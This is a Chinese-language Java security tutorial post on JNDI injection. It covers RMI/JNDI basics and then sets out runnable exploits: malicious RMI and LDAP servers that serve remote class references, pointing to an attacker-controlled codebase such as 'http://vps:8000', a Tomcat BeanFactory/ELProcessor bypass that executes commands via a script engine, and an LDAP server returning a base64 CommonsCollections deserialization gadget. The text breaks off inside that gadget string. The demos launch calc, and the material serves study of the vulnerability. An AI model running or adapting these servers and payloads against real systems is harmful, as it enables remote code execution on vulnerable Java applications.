---
title: JNDI
date: 2025-09-24T21:00:00+08:00
tags:
  - "JNDI 注入"
categories:
  - "Java安全"
description: JNDI
showToc: true
draft: false
tocOpen: true
---
# 一、JNDI 简介
JNDI(Java Naming and Directory Interface，Java命名和目录接口) 是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106579.png)







| **<font style="color:rgb(102, 102, 102);">协议</font>** | **<font style="color:rgb(102, 102, 102);">作用</font>** |
| --- | --- |
| <font style="color:rgb(102, 102, 102);">LDAP</font> | <font style="color:rgb(102, 102, 102);">轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</font> |
| <font style="color:rgb(102, 102, 102);">RMI</font> | <font style="color:rgb(102, 102, 102);">JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</font> |
| <font style="color:rgb(102, 102, 102);">DNS</font> | <font style="color:rgb(102, 102, 102);">域名服务</font> |
| <font style="color:rgb(102, 102, 102);">CORBA</font> | <font style="color:rgb(102, 102, 102);">公共对象请求代理体系结构</font> |




# 二、JNDI 实现
```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteObj extends Remote {
    public String sayHello(String keywords) throws RemoteException;
}
```



```java
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException {
        IRemoteObj remoteObj = new RemoteObjImpl();
        Registry r = LocateRegistry.createRegistry(1099);
        r.bind("remoteObj", remoteObj);
    }
}
```



```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {
    public RemoteObjImpl() throws RemoteException {
    }

    @Override
    public String sayHello(String keywords) {
        String upKeywords = keywords.toUpperCase();
        System.out.println(upKeywords);
        return upKeywords;
    }

}
```



```java
import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```



```java
import javax.naming.InitialContext;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
    }
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242106238.png)





# 三、JNDI 注入
## 3.1 分析漏洞如何产生
此处断点调试，跟进 lookup

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107810.png)

InitialContext.lookup

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107722.png)

GenericURLContext.lookup

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107072.png)

RegistryContext.lookup

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107413.png)

RegistryImpl_Stub.lookup      到这里就不用跟了，攻击方式和 RMI 中攻击注册中心一样，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107847.png)



> RMI 中的攻击注册中心：[https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5](https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5)
>



## 3.2 <font style="color:rgb(80, 80, 92);">Jndi + RMI</font>
### 复现：
 先写一个弹出计算器类并编译：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107819.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107878.png)



之后用 python 开一个 http 服务，监听 7777 端口

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107851.png)



服务端：

```java
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();

        //initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());


        // 在当前 JVM 中启动（或创建）一个 RMI registry，监听端口 1099
        Registry registry = LocateRegistry.createRegistry(1099);
        //将 JndiCalc 类的 JndiCalc 方法，放到 http://localhost:7777/
        // 创建一个 Reference 对象（指向一个可通过工厂/远程位置获取的类）
        Reference reference = new Reference("JndiCalc", "JndiCalc", "http://localhost:7777/");
        // 将 Reference 绑定到 JNDI 命名空间中的 rmi URL 下
        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
    }
}
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242107319.png)

然后用客户端访问，

```java
import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

弹出计算器：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108358.png)



这个调用过程就是 3.1 中以及分析过的，实际上还是调用了 lookup 方法



### 调试：


在客户端的 lookup 处断点

跟到 RegistryImpl_Stub 这里，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108548.png)

继续跟进

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108935.png)

这里看到 var2 被赋值了 ，这里的 var2 是一个对象变量，Ref 将值传递给了它

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108230.png)

步入 decodeObject ，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242108027.png)

<font style="color:rgb(80, 80, 92);">先做了一个简单的判断，判断是否为 </font>`ReferenceWrapper`，也就是判断是否为 `Reference` 对象

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109861.png)

继续跟进 getObjectInstance

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242109168.png)

这里使用强转将 refInfo 转为 Reference 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110137.png)



<font style="color:rgb(80, 80, 92);">继续往下走，</font><font style="color:rgb(83, 83, 96);">getObjectFactoryBuilder() 这里获取到了恶意类</font>



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110090.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110041.png)

<font style="color:rgb(80, 80, 92);">继续往下走，获取到 codebase，并且进行 helper.loadClass()</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110781.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110428.png)

来到 newInstance() 后会调用 JndiCalc 类执行代码

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110895.png)





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242110953.png)





## 3.2 Jndi + LDAP
### LDAP 简介
Lightweight Directory Access Protocol （轻量级目录访问协议）是一种开放的、与供应商无关的行业标准应用协议， 用于通过互联网协议(IP) 网络访问和维护分布式目录信息服务。目录服务在开发内联网和互联网应用程序中发挥着重要作用，因为它允许在整个网络中共享有关用户、系统、网络、服务和应用程序的信息。例如，目录服务可以提供任何有组织的记录集，通常具有层次结构，例如公司电子邮件目录。同样，电话簿是包含地址和电话号码的用户列表。

### <font style="color:rgb(25, 27, 31);">LDAP 身份验证的基本流程：</font>
1. **<font style="color:rgb(25, 27, 31);">用户提供凭证</font>**<font style="color:rgb(25, 27, 31);">：用户通过客户端应用（如数据库客户端）输入用户名和密码。</font>
2. **<font style="color:rgb(25, 27, 31);">客户端与 LDAP 服务器通信</font>**<font style="color:rgb(25, 27, 31);">：客户端通过 LDAP 协议与 LDAP 服务器通信，将用户名和密码发送给 LDAP 服务器。</font>
3. **<font style="color:rgb(25, 27, 31);">LDAP 服务器验证</font>**<font style="color:rgb(25, 27, 31);">：LDAP 服务器检查用户名是否存在，并对密码进行验证。</font>
4. **<font style="color:rgb(25, 27, 31);">返回验证结果</font>**<font style="color:rgb(25, 27, 31);">：如果用户名和密码匹配，LDAP 服务器返回认证成功的信息，允许用户访问资源。否则，返回认证失败。</font>

<font style="color:rgb(25, 27, 31);">LDAP 支持多种认证方式，如：</font>

+ **匿名认证**<font style="color:rgb(25, 27, 31);">：不需要提供凭证，但访问权限有限。</font>
+ **简单认证**<font style="color:rgb(25, 27, 31);">：用户提供用户名和密码进行身份验证。</font>
+ **SASL**（简单认证和安全层）认证：用于更复杂的认证机制，提供更高的安全性。

### <font style="color:rgb(25, 27, 31);">LDAP 目录服务的常用结构</font>
<font style="color:rgb(25, 27, 31);">LDAP 目录中的信息组织为树形结构，称为 </font>**<font style="color:rgb(25, 27, 31);">目录信息树（DIT）</font>**<font style="color:rgb(25, 27, 31);">。常见的条目包括用户、组织、</font>部门等。条目使用 Distinguished Name (DN) 进行标<font style="color:rgb(25, 27, 31);">识，DN 包括所有节点的完整路径。例如，一个用户条目的 DN 可能是：</font>

`uid=john,ou=users,dc=example,dc=com`

<font style="color:rgb(25, 27, 31);">其中：</font>

+ `uid=john`<font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示用户名为 john。</font>
+ `ou=users`<font style="color:rgb(25, 27, 31);"> </font><font style="color:rgb(25, 27, 31);">表示该条目属于“users”组织单元。</font>
+ `dc=example,dc=com`表示 LDAP 服务器的域名是 `example.com`。

### 漏洞复现：


导入`unboundid-ldapsdk` 的依赖。

```xml
<dependencies>
  <dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.2.0</version>
    <scope>test</scope>
  </dependency>
</dependencies>
```



#### Ldap 服务端：
##### 代码搭建
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        //此处的 url 表示返回给客户端的 codebaseURL (http://127.0.0.1:8000)
        //格式为：http://127.0.0.1:port/#Refname；
        //Refname 就是要加载的类，port 为 http 监听的端口
        String url = "http://127.0.0.1:8000/#JndiCalc";
        //ldap 服务监听的端口，客户端连接这个端口执行 lookup
        int port = 1234;
        try {
            //配置 LDAP 监听器
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

            //注册拦截器，该拦截器在收到 search 操作时会被调用，可以自定义返回的 entry ；正是实现“返回恶意 LDAP 引用”的地方。
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        //当 LDAP 客户端做 search/lookup 时触发
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        ///组装返回的 LDAP 条目
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```





客户端：

```java
import javax.naming.InitialContext;

public class JNDILdapClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        //        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("ldap://localhost:1099/remoteObj");
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("ldap://127.0.0.1:1234/EvilObject");

        System.out.println(remoteObj.sayHello("hello"));
    }
}
```



用 python 开一个服务监听 8000端口

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113052.png)



接下来启动服务端，启动客户端，弹出计算器

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113525.png)





##### 使用 ApacheDirectoryStudio 搭建 LDAP 服务
**注意：系统的 java 环境使用 jdk 11，jdk 8 的版本都运行不了 LDAP 环境！**

新建一个 LDAP 服务，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250821834.png)

这样就搭建成功了：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242113529.png)







> 注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被设置为 false，对 LDAP Reference 远程工厂类的加载增加了限制。
>
> 所以，当JDK版本介于 8u191、7u201、6u211 与 6u141、7u131、8u121 之间时，我们就可以利用LDAP+Reference 的技巧来进行JNDI注入的利用。
>
> <font style="color:rgb(80, 80, 92);">因此，</font>**<font style="color:rgb(80, 80, 92);">这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下</font>**<font style="color:rgb(80, 80, 92);">。</font>
>



## 3.3 <font style="color:rgb(76, 76, 87);">jndi 结合 CORBA</font>
> 一个简单的流程是：`resolve_str` 最终会调用到 `StubFactoryFactoryStaticImpl.createStubFactory` 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 `RMIClassLoader`，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。
>





## 3.4 绕过 jdk 高版本
### 3.4.1 8u191 之前
这里的版本为 jdk 8u121 < temp < 8u191 

这个之间版本绕过方法便是上文所述的 ldap 的 jndi 漏洞

### 3.4.2 8u191 之后
**<font style="color:rgb(80, 80, 92);">8u191 之后，在使用 </font>**`URLClassLoader`**<font style="color:rgb(80, 80, 92);"> 加载器加载远程类时，</font>**<font style="color:rgb(80, 80, 92);">通过添加 </font>**<font style="color:rgb(83, 83, 96);">trustURLCodebase 的值是否为 true</font>**<font style="color:rgb(80, 80, 92);"> ，让我们无法加载 codebase，也就是无法进行 URLClassLoader 的攻击。</font>

<font style="color:rgb(80, 80, 92);">要想绕过就要找到这么一个类：</font>

+ <font style="color:rgb(80, 80, 92);">服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用</font>
+ <font style="color:rgb(80, 80, 92);">Factory 类必须实现 </font>`javax.naming.spi.ObjectFactory`<font style="color:rgb(80, 80, 92);"> 接口，可利用该接口的 getObjectInstance() 方法</font>

我们找到 `org.apache.naming.factory.BeanFactory`类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 `getObjectInstance()` 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。



#### 绕过一：<font style="color:rgb(76, 76, 87);">利用本地恶意 Class</font>
##### 环境：
首先是 tomcat 环境，以下三个必须存在并且版本尽量选在 9.0.64 以前的，（9.0.64 以后的版本大多数漏洞都被修复了，不能利用）

```xml
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api -->
<dependency>
  <groupId>org.apache.tomcat</groupId>
  <artifactId>tomcat-el-api</artifactId>
  <version>8.5.66</version>
</dependency>

<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el -->
<dependency>
  <groupId>org.apache.tomcat</groupId>
  <artifactId>tomcat-jasper-el</artifactId>
  <version>8.5.66</version>
</dependency>

<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina -->
<dependency>
  <groupId>org.apache.tomcat</groupId>
  <artifactId>tomcat-catalina</artifactId>
  <version>8.5.66</version>
</dependency>
```



##### 源码复现：
参考：[https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F) 

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// JNDI 高版本 jdk 绕过服务端  
public class JNDIBypassHighJava {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry( 1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                                          true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                                  ".newInstance().getEngineByName(\"JavaScript\")" +
                                  ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        System.out.println("[*]Evil command: calc");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

​	

```java
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;

public class JNDIBypassHighJavaServerRebind {
    public static void main(String[] args) throws Exception{

        InitialContext initialContext = new InitialContext();
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",
                                                  true,"org.apache.naming.factory.BeanFactory",null );
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x","Runtime.getRuntime().exe('calc')" ));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
        System.out.println("ServerRebind Success");
    }
}
```





```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIBypassHighJavaClient {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1099/Object";
        Context context = new InitialContext();
        context.lookup(uri);
    }
}
```





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115690.png)



##### 分析：


前面的流程还是进入 `lookup` 方法，到 `RegistryContext` 类的 `decodeObject()` 方法，这个方法当中调用了 `getObjectInstance()`。然后来到 `getObjectFactoryFromReference`<font style="color:#080808;background-color:#ffffff;"> 开始跟：</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115373.png)

然后通过 loadClass 加载 `org.apache.naming.factory.BeanFactory`<font style="color:#080808;background-color:#ffffff;">并赋值给 clas </font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117328.png)

<font style="color:#080808;background-color:#ffffff;">将 clas 强转为 </font>**<font style="color:#080808;background-color:#ffffff;">ObjectFactory  </font>**<font style="color:#080808;background-color:#ffffff;">类型</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117362.png)

然后经过一系列复杂的赋值，最终在 ref 的 className 中获取到了 "javax.el.ELProcessor" ，classFactory 获取到了"org.apache.naming.factory.BeanFactory"

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117627.png)



**getObjectInstance**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117347.png)

到了 getObjectInstance 之后便是整理变量，准备执行 invoke 方法

ra  通过利用 Java 的脚本引擎（JavaScript ）在运行时构造并调用 `ProcessBuilder`，最终在目标主机上执行系统命令 `calc`，就是获取 beanClass 即 `javax.el.ELProcessor` 类的 eval() 方法并和 x 属性

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118019.png)

可以看到这里的一个 value 中封装的就是恶意代码

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117409.png)

最终代码在 method.invoke 处，<font style="color:rgb(80, 80, 92);">通过method.invoke()即反射调用的来执行</font>  
`"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()")`。弹出计算器。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118772.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118088.png)	





#### 绕过二：<font style="color:rgb(33, 53, 71);">LDAP返回序列化数据，触发本地Target</font>
> LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的`obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。



##### <font style="color:rgb(80, 80, 92);">复现：</font>
```xml
<dependencies>
  <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.80</version>
  </dependency>
  <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
  </dependency>
  <!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk -->
  <dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>3.1.0</version>
    <scope>compile</scope>
  </dependency>
</dependencies>
```



```java
import com.unboundid.util.Base64;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class JNDIGadgetServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://vps:8000/#ExportObject";
        int port = 1234;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            // Payload1: 利用LDAP+Reference Factory  
//            e.addAttribute("javaCodeBase", cbstring);  
//            e.addAttribute("objectClass", "javaNamingReference");  
//            e.addAttribute("javaFactory", this.codebase.getRef());  

            // Payload2: 返回序列化Gadget
            try {
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAG